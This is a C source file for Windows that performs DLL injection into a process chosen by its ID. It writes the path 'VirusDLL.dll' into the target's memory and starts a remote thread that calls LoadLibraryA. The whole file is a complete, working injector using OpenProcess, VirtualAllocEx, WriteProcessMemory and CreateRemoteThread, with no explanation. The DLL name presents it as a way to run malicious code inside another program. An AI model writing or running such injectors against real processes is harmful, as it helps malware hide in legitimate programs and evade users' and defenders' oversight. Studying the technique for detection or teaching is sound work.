#include <Windows.h>
#include <winerror.h>
#include <stdio.h>

int main(int argc, char* argv[])
{
    if (argc != 2)
    {
        printf("Usage: %s <PID>\n",argv[0]);
        return 1;
    }
    char szDLLPathToInject[] = { "VirusDLL.dll" };
    int nDLLPathLen = lstrlenA(szDLLPathToInject);
    int nTotBytesToAllocate = nDLLPathLen + 1; // including NULL character.

    // 0. Open The process
    HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, atoi(argv[1]));
    if (!hProcess)
    {
        printf("[X] ERROR: OpenProcess failed : %lu\n",GetLastError());
        return 1;
    }
    printf("[+] OpenProcess succeeded\n");
    // 1. Alocate heap memory in remote process
    LPVOID lpHeapBaseAddress1 = VirtualAllocEx(hProcess, NULL, nTotBytesToAllocate, MEM_COMMIT, PAGE_READWRITE);
    if (!lpHeapBaseAddress1)
    {
        printf("[X] ERROR: VirtualAllocEx failed : %lu\n",GetLastError());
        CloseHandle(hProcess);
        return 1;
    }
    printf("[+] VirtualAllocEx succeeded\n");
    // 2. Write the DLL path in the remote alocated heap memory.
    SIZE_T lNumberOfBytesWritten = 0;
    if (!WriteProcessMemory(
            hProcess,
            lpHeapBaseAddress1,
            szDLLPathToInject,
            nTotBytesToAllocate,
            &lNumberOfBytesWritten))
    {
        printf("[X] ERROR: WriteProcessMemory failed : %lu\n",GetLastError());

        VirtualFreeEx(
            hProcess,
            lpHeapBaseAddress1,
            0,
            MEM_RELEASE);

        CloseHandle(hProcess);
        return 1;
    }
    printf("[+] WriteProcessMemory succeeded (%zu bytes)\n",lNumberOfBytesWritten);

    // 3.0. Get the starting address of the function LoadLibrary which is available in kernal32.dll
    LPTHREAD_START_ROUTINE lpLoadLibraryStartAddress = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle("Kernel32.dll"), "LoadLibraryA");

    // 3.1. Call LoadLibraryin remote process and pass the remote heap memory which contains the dll path to load.
    HANDLE hRemoteThread =
        CreateRemoteThread(
            hProcess,
            NULL,
            0,
            lpLoadLibraryStartAddress,
            lpHeapBaseAddress1,
            0,
            NULL);

    if (!hRemoteThread)
    {
        printf("[X] ERROR: CreateRemoteThread failed : %lu\n",GetLastError());
        CloseHandle(hProcess);
        return 1;
    }
    printf("[+] CreateRemoteThread succeeded\n");

    WaitForSingleObject(hRemoteThread, INFINITE);

    DWORD dwExitCode = 0;

    if (!GetExitCodeThread(hRemoteThread, &dwExitCode))
    {
        printf("[X] ERROR: GetExitCodeThread failed : %lu\n", GetLastError());
    }
    else
    {
        if (dwExitCode == 0)
        {
            printf("[X] ERROR: DLL was not loaded\n");
        }
        else
        {
            printf("[+] LoadLibraryA returned: 0x%lX\n",dwExitCode);
        }
    }
    VirtualFreeEx(
        hProcess,
        lpHeapBaseAddress1,
        0,
        MEM_RELEASE);
    CloseHandle(hRemoteThread);
    CloseHandle(hProcess);
    return 0;
}
